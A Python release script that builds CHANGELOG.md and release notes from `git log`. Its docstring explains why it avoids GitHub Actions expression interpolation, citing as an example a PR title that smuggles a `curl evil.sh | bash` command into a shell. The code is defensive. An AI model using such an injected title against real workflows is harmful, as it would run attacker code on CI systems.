"""Build this release's changelog entry straight from `git log`, read at runtime -- never from any GitHub Action
output (e.g. release-drafter's own rendered `body`, which is built from PR titles an outside contributor
controls). Splicing an untrusted string like a PR title into a `run:` block via `${{ }}` is a known GitHub
Actions script-injection vector (the substitution happens before the shell ever sees the script, so a title like
`"; curl evil.sh | bash #` becomes literal shell syntax); reading the same text ourselves via `subprocess` and
writing it straight to a file sidesteps that class of vulnerability entirely, since it never passes through
workflow-expression interpolation at all.

Prepends a new section to CHANGELOG.md and writes the same body to /tmp/release_notes.md for
`gh release create --notes-file` to consume as a plain file argument (again, never interpolated into command
syntax).
"""
from __future__ import annotations

import datetime
import os
import subprocess
from pathlib import Path

CHANGELOG = Path("CHANGELOG.md")
RELEASE_NOTES = Path("/tmp/release_notes.md")


def commit_log(rev_range: str) -> str:
    result = subprocess.run(["git", "log", "--no-merges", "--pretty=format:- %s (%h)", rev_range],
                             capture_output=True, text=True, check=True)
    lines = [line for line in result.stdout.splitlines() if line.strip()]
    return "\n".join(lines) if lines else "- No changes recorded."


def main() -> None:
    new_version = os.environ["NEW_VERSION"]
    previous_tag = os.environ.get("PREVIOUS_TAG", "").strip()
    rev_range = f"{previous_tag}..HEAD" if previous_tag else "HEAD"

    body = commit_log(rev_range)
    date = datetime.date.today().isoformat()
    entry = f"## v{new_version} — {date}\n\n{body}\n"

    existing = CHANGELOG.read_text(encoding="utf-8") if CHANGELOG.exists() else "# Changelog\n"
    lines = existing.splitlines(keepends=True)
    if lines and lines[0].startswith("# Changelog"):
        title = lines[0].rstrip("\n")
        rest_lines = lines[1:]
    else:
        title, rest_lines = "# Changelog", lines
    # Only "## " release sections are ever preserved across runs -- any preamble above the first one (e.g. this
    # file's initial one-time explanatory note) is dropped here rather than getting pushed one section further
    # down on every subsequent release.
    first_entry = next((i for i, line in enumerate(rest_lines) if line.startswith("## ")), len(rest_lines))
    remainder = "".join(rest_lines[first_entry:])

    new_content = f"{title}\n\n{entry}\n{remainder}".rstrip("\n") + "\n"
    CHANGELOG.write_text(new_content, encoding="utf-8")
    RELEASE_NOTES.write_text(body + "\n", encoding="utf-8")
    print(f"Changelog entry for v{new_version} written ({rev_range}).")


if __name__ == "__main__":
    main()
